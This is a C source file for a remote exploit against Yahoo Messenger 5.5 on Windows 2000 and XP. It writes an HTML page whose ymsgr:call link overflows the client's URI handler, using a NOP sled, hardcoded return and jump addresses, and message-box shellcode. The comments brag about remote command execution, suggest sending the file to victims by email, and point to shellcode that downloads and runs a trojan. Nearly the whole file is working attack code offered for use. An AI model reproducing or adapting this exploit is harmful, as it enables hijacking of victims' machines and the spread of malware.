/* Yahpoo.c by bob@dtors.net  [www.dtors.net] [DSR]
 *
 * Why Yahoo Messenger have not fixed this vulnerbility
 * I dont know...but either way they are stupid!
 * 
 * This exploit has been tested on:
 * Yahoo Messenger 5,5,0,1246
 * Yahoo Module 5,5,0,454
 * 
 * For:
 * Windows 2000 Professional 5.0.2195 SP3
 *
 * Rave@dtors.net has released a windows [exe] version of this
 * exploit but for Windows XP Pro SP1. 
 * So both targets are vulnerable XP/2k...some addresses might need changing.
 *
 * Problems that may occur:
 * 
 * The addresses used may vary from box to box..so they might need changing.
 * The stack may keep on changing the location of your shellcode address..you
 * need to hit a static sector that will not alternate. [this is the reason we jmp]
 * There exist two crashes...the first one we bypass..this is the access violation
 * when you hit the nop sled the first time round. The second crash is where we 
 * hit the nop sled...so dont get confused between the 2.
 *
 * The shellcode used here...will not do anything malicious..just opens a popup box
 * You can change this shellcode to something else...but the buffer is not very big
 * so there is no chance of a bind shell or anything.
 * Sloth from nopninjas.com has a shellcode that will download a trojan
 * and execute it. Nice and small as well ;)
 *
 * Thats about it...this exploit will lead to remote command execution on the
 * victim. Bare in mind this is triggered via bad URI handling...and the victim
 * needs to actually view the evil html file..this can be done automatically via
 * email >:)
 *
 * Big Lovin to rica.
 * Thanks to rave for his time.
 * Greetz:
 * mercy, Redg, opy, phreez, eSDee, ilja, looney, The_itch, angelo, inv, kokanin,
 * macd, SiRVu|can, Sally, Lucipher, gloomy, phaze, uproot, b0f.
 * special thanks to sloth@nopninjas
 *
 * 
 * bob@dtors.net www.dtors.net
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h> 
#define MessageBoxA "\x1d\x97\x53\x01"


char ret[8]= "\xD5\x96\x7A\x01";


unsigned char win32_msgbox[] = {
    "\xEB\x19\x5E\x33\xC9\x89\x4E\x05\xB8" MessageBoxA  "\x2D\x01\x01"
    "\x01\x01\x8B\x18\x6A\x10\x56\x56\x51\xFF\xD3\xE8\xE2\xFF\xFF\xFF"
    "\x62\x6f\x62\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
};	

int main(int argc,char *argv[])
{
 FILE *evil;
 char *shellcode = win32_msgbox;
 unsigned char buffer[5000];
 int offset=320;

                fprintf(stdout, "\n\tYahPoo.c By bob.\n");
	        fprintf(stdout, "Remote Exploit for Yahoo! Messenger 5.5\n");
	        fprintf(stdout, "\tDSR-[www.dtors.net]-DSR\n\n");

                fprintf(stdout,"Makin' da EbUL HTML File... ");
		if ((evil =fopen("yahoo.html","w"))==NULL){
			fprintf(stderr,"Failed\n");
			exit(1);
			} else {
			fprintf(stderr,"Opened!\n");
			}



	memset(buffer,0x00,offset+32+strlen(shellcode));
 	memset(buffer,0x90,offset);


	memcpy(buffer+offset,ret,4);
	memcpy(buffer+offset+4,shellcode,strlen(shellcode));

        buffer[264] = 0xD4;   //address of &shellcode
        buffer[265] = 0x96;
        buffer[266] = 0x7A;
        buffer[267] = 0x01;
        
        buffer[272] = 0xF5;   //jmp 0xc [msvcrt.dll]
	buffer[273] = 0x01;
	buffer[274] = 0x01;
	buffer[275] = 0x78;

	fprintf(evil,"<html>");
	fprintf(evil,"<title>Bought to you by dtors.net!</title>\n");
	fprintf(evil,"<B>Dtors Security Research (DSR)</B>\n");
	fprintf(evil,"<p>Yahoo Messenger 5.5 exploit....</p>\n");
	fprintf(evil,"<pre>");
	fprintf(evil,"<a href=%cymsgr:call?%s%c>!EbUL Link!</a></body></pre></html>\x00\x00\x00",0x22,buffer,0x22);
	fclose(evil); // <-- closing yahoo.html
	
	fprintf(stdout,"\nDa ebUL HTML file is >>yahoo.html<<\nEnjoy!\nwww.dtors.net\n\n");

  } //end main


